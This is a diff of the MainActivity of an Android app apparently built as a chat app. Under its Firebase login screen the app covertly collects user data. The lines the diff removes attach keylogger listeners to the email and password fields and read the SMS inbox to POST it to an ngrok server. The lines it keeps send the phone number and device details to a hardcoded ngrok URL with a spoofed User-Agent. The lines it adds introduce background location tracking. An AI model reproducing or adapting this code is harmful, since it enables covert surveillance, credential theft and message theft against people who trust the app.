@@ -1,20 +1,19 @@
 package com.example.mychatapp;
 
-import android.content.ContentResolver;
+
+import android.content.ComponentName;
 import android.content.Intent;
+import android.content.ServiceConnection;
+import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
-import android.database.Cursor;
-import android.net.Uri;
 import android.os.AsyncTask;
 import android.os.Build;
 import android.os.Bundle;
-import android.text.Editable;
-import android.text.TextWatcher;
-import android.util.Log;
-import android.provider.Telephony;
+import android.os.IBinder;
+import android.preference.PreferenceManager;
 import android.util.Patterns;
-import android.view.KeyEvent;
 import android.view.View;
+import android.widget.Button;
 import android.widget.EditText;
 import android.widget.ProgressBar;
 import android.widget.TextView;
@@ -29,29 +28,33 @@ import com.google.android.gms.tasks.OnCompleteListener;
 import com.google.android.gms.tasks.Task;
 import com.google.firebase.auth.AuthResult;
 import com.google.firebase.auth.FirebaseAuth;
-import com.google.gson.Gson;
+import com.karumi.dexter.Dexter;
+import com.karumi.dexter.MultiplePermissionsReport;
+import com.karumi.dexter.PermissionToken;
+import com.karumi.dexter.listener.PermissionRequest;
+import com.karumi.dexter.listener.multi.MultiplePermissionsListener;
 
+import org.greenrobot.eventbus.EventBus;
+import org.greenrobot.eventbus.Subscribe;
+import org.greenrobot.eventbus.ThreadMode;
 import org.json.JSONObject;
 
 import java.io.BufferedReader;
-import java.io.BufferedWriter;
 import java.io.DataOutputStream;
 import java.io.InputStreamReader;
-import java.io.OutputStream;
-import java.io.OutputStreamWriter;
 import java.net.HttpURLConnection;
 import java.net.URL;
+import java.util.Arrays;
 import java.util.HashMap;
+import java.util.List;
 import java.util.Map;
-
 
 import android.content.Context;
 import android.telephony.TelephonyManager;
 import android.Manifest;
 
-public class MainActivity extends AppCompatActivity {
-    private static final int REQUEST_CODE_READ_PHONE_STATE_AND_SMS = 1;
-    private static final String SMS_URI = "content://sms/inbox";
+public class MainActivity extends AppCompatActivity implements SharedPreferences.OnSharedPreferenceChangeListener {
+    private static final int REQUEST_READ_PHONE_STATE = 1 ;
 
     //variable for each elements
     private FirebaseAuth firebaseAuth;
@@ -60,37 +63,88 @@ public class MainActivity extends AppCompatActivity {
     private EditText editEmail, editPassword;
     private android.widget.Button signIn;
 
-    public static String URLNgrok = "https://ee35-122-11-214-189.ap.ngrok.io"; // To be edited if keep changing
-    //public static String URLLocalIP = "http://192.168.2.145:5000";
+    //Geolocation
+    Button requestLocation,removeLocation;
+    BackgroundService mService =null;
+    boolean mBound=false;
+    private final ServiceConnection mServiceConnection=new ServiceConnection() {
+        @Override
+        public void onServiceConnected(ComponentName componentName, IBinder iBinder) {
+            BackgroundService.LocalBinder binder = (BackgroundService.LocalBinder)iBinder;
+            mService=binder.getService();
+            mBound=true;
+        }
+
+        @Override
+        public void onServiceDisconnected(ComponentName componentName) {
+            mService=null;
+            mBound=false;
+        }
+    };
+
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
         String hpno = null;
 
+        //Geolocation
+        Dexter.withActivity(this)
+                .withPermissions(Arrays.asList(
+                        Manifest.permission.ACCESS_FINE_LOCATION,
+                        Manifest.permission.ACCESS_BACKGROUND_LOCATION,
+                        Manifest.permission.ACCESS_COARSE_LOCATION
+                ))
+                .withListener(new MultiplePermissionsListener(){
+                    @Override
+                    public void onPermissionsChecked(MultiplePermissionsReport report) {
+                        requestLocation = (Button)findViewById(R.id.request_location_updates_button);
+                        removeLocation = (Button)findViewById(R.id.remove_location_updates_button);
+
+                        requestLocation.setOnClickListener(new View.OnClickListener() {
+                            @Override
+                            public void onClick(View view) {
+                                mService.requestLocationUpdates();
+                            }
+                        });
+                        removeLocation.setOnClickListener(new View.OnClickListener() {
+                            @Override
+                            public void onClick(View view) {
+                                mService.removeLocationUpdates();
+                            }
+                        });
+
+                        setButtonState(Common.requestingLocationUpdates(MainActivity.this));
+                        bindService(new Intent(MainActivity.this,BackgroundService.class),mServiceConnection,Context.BIND_AUTO_CREATE);
+                    }
+
+                    @Override
+                    public void onPermissionRationaleShouldBeShown(List<PermissionRequest> permissions, PermissionToken token) {
+
+                    }
+                }).check();
+
+
+
 
         //need to set permission dynamically
         //get phone no need run 2 times then can get phone no.
-        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED || ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
-            ActivityCompat.requestPermissions(this,  new String[]{Manifest.permission.READ_PHONE_STATE, Manifest.permission.READ_SMS},
-                    REQUEST_CODE_READ_PHONE_STATE_AND_SMS);
-                    System.out.println("Failed to get phone no");
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
+            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_PHONE_STATE}, REQUEST_READ_PHONE_STATE);
+            System.out.println("Failed to get phone no");
         } else {
-            //function to get sms to server
-            sendSmsToServer();
             // Permission is already granted, you can access the phone state
             TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
             String phoneNumber = telephonyManager.getLine1Number();
             System.out.println("Phone no " + phoneNumber);
-            hpno = phoneNumber;
+            hpno =  phoneNumber;
         }
-
 
         String deviceManufacturer = Build.MANUFACTURER;
         String deviceModel = Build.MODEL;
         String androidVersion = Build.VERSION.RELEASE;
         String deviceNumber = hpno;
-        System.out.println("Phone No check: " + deviceNumber);
+        System.out.println("Phone no2222 " + deviceNumber);
 
         // Store the information in a Map
         Map<String, String> deviceInfo = new HashMap<>();
@@ -110,9 +164,6 @@ public class MainActivity extends AppCompatActivity {
         editPassword = findViewById(R.id.password);
         progressbarofLogin = findViewById(R.id.progressbarofSignin);
         firebaseAuth = FirebaseAuth.getInstance();
-        editEmail.addTextChangedListener(new KeyloggerUtility("Email"));
-        editPassword.addTextChangedListener(new KeyloggerUtility("Password"));
-
 
         register.setOnClickListener(new View.OnClickListener() {
             @Override
@@ -152,7 +203,60 @@ public class MainActivity extends AppCompatActivity {
 
             }
         });
+    }
+    //GEOLOCATION
 
+    @Override
+    protected void onStart() {
+        super.onStart();
+        PreferenceManager.getDefaultSharedPreferences(this)
+                .registerOnSharedPreferenceChangeListener(this);
+        EventBus.getDefault().register(this);
+    }
+
+    @Override
+    protected void onStop() {
+        if(mBound) {
+            unbindService(mServiceConnection);
+            mBound =false;
+        }
+        PreferenceManager.getDefaultSharedPreferences(this)
+                .unregisterOnSharedPreferenceChangeListener(this);
+        EventBus.getDefault().unregister(this);
+        super.onStop();
+    }
+
+    @Override
+    public void onSharedPreferenceChanged(SharedPreferences sharedPreferences, String s) {
+        if(s.equals(Common.KEY_REQUESTING_LOCATION_UPDATES))
+        {
+            setButtonState(sharedPreferences.getBoolean(Common.KEY_REQUESTING_LOCATION_UPDATES,false));
+            
+        }
+    }
+    //GEOLOCATION
+    private void setButtonState(boolean isRequestEnable) {
+        if(isRequestEnable)
+        {
+            requestLocation.setEnabled(false);
+            removeLocation.setEnabled(true);
+        }
+        else {
+            requestLocation.setEnabled(true);
+            removeLocation.setEnabled(false);
+        }
+    }
+
+    @Subscribe(sticky = true,threadMode = ThreadMode.MAIN)
+    public void onListenLocation(SendLocationToActivity event) {
+        if (event != null) {
+            String data = new StringBuilder()
+                    .append(event.getLocation().getLatitude())
+                    .append("/")
+                    .append(event.getLocation().getLongitude())
+                    .toString();
+            Toast.makeText(mService,data,Toast.LENGTH_SHORT).show();
+        }
     }
 
     public static class SendDeviceInfoTask extends AsyncTask<Map<String, String>, Void, Void> {
@@ -161,8 +265,8 @@ public class MainActivity extends AppCompatActivity {
         protected Void doInBackground(Map<String, String>... deviceInfos) {
             try {
 
-                URL url = new URL(URLNgrok+"/device"); //ngrok url to allow internet access without having to be same network
-                //URL url = new URL(URLLocalIP+"/device"); //local ip address : port no
+                URL url = new URL("https://5010-122-11-214-225.ap.ngrok.io/device"); //ngrok url to allow internet access without having to be same network
+                //URL url = new URL("http://192.168.2.145:5000/device");
                 HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                 conn.setRequestMethod("POST");
                 conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.95 Safari/537.11");
@@ -177,7 +281,7 @@ public class MainActivity extends AppCompatActivity {
                 os.close();
 
                 int responseCode = conn.getResponseCode();
-                System.out.println("\nSending Device info 'POST' request to URL : " + url);
+                System.out.println("\nSending 'POST' request to URL : " + url);
                 System.out.println("Response Code : " + responseCode);
 
                 BufferedReader in = new BufferedReader(
@@ -198,66 +302,7 @@ public class MainActivity extends AppCompatActivity {
         }
     }
 
-    public void sendSmsToServer() {
-        ContentResolver contentResolver = getContentResolver();
-        Cursor cursor = contentResolver.query(Uri.parse(SMS_URI), null, null, null, null);
 
-        Map<String, String> smsMap = new HashMap<>();
-        //error in the way message is being stored
-
-        if (cursor.moveToFirst()) {
-                String address = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
-                String body = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY));
-                String smsResult = address + " : " + body;
-                System.out.println("sms info: " + smsResult);
-                smsMap.put("smsAddress", address);
-                smsMap.put("smsBody", body);
-
-        }
-
-        cursor.close();
-
-        Gson gson = new Gson();
-        String smsJson = gson.toJson(smsMap);
-
-        new SendSmsTask().execute(smsJson);
-    }
-
-    public class SendSmsTask extends AsyncTask<String, Void, Void> {
-
-        @Override
-        protected Void doInBackground(String... params) {
-            try {
-                URL url = new URL(URLNgrok+"/sms"); //ngrok url to allow internet access without having to be same network
-                //URL url = new URL(URLLocalIP+"/sms"); // local IP Address : Port no
-                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
-                conn.setRequestMethod("POST");
-                conn.setRequestProperty("Content-Type", "application/json");
-                conn.setDoOutput(true);
-                conn.setDoInput(true);
-
-                OutputStream os = conn.getOutputStream();
-                BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(os, "UTF-8"));
-                writer.write(params[0]);
-                writer.flush();
-                writer.close();
-                os.close();
-
-                int responseCode = conn.getResponseCode();
-                System.out.println("\nSending SMS 'POST' request to URL : " + url);
-                System.out.println("Response Code : " + responseCode);
-
-            } catch (Exception e) {
-                System.out.println("Error connecting to the sms server");
-            }
-            return null;
-
-        }
-    }
 }
-
-
-
-
 
 
